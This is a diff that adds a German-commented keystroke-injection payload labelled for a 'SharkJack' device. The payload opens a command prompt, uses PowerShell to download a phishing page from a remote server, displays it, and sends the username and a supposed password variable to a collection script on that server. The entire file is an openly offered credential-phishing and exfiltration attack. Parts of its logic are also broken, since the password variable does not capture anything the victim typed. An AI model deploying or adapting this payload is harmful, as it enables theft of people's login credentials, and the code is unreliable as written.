@@ -1,0 +1,32 @@
+# Beginne damit, den SharkJack einzurichten
+LED SETUP
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING cmd
+QUACK ENTER
+QUACK DELAY 500
+
+# Führe ein PowerShell-Skript aus, um die Phishing-Seite von einem Remote-Server herunterzuladen
+QUACK STRING powershell -c "Invoke-WebRequest -Uri 'http://deinserver.com/phishingseite.html' -OutFile '$env:temp\phishingseite.html'"
+QUACK ENTER
+QUACK DELAY 3000
+
+# Öffne die Phishing-Seite im Standardbrowser
+QUACK STRING start $env:temp\phishingseite.html
+QUACK ENTER
+QUACK DELAY 5000
+
+# Warte darauf, dass der Benutzer seine Anmeldeinformationen eingibt und das Formular absendet
+# Hinweis: Diese Verzögerung muss möglicherweise je nach Spezifikationen Ihrer Phishing-Seite und des Ziel-Systems angepasst werden
+QUACK DELAY 30000
+
+# Sammle die Anmeldeinformationen und sende sie an einen Remote-Server
+# Hinweis: Dies setzt voraus, dass Sie einen Server eingerichtet haben, der die Anmeldeinformationen empfangen und speichern kann
+QUACK STRING powershell -c "Invoke-WebRequest -Uri 'http://deinserver.com/sammeln.php?benutzer=$($env:USERNAME)&passwort=$($env:password)'"
+QUACK ENTER
+QUACK DELAY 5000
+
+# Räume auf und beende das Skript
+LED FINISH
+QUACK STRING exit
+QUACK ENTER
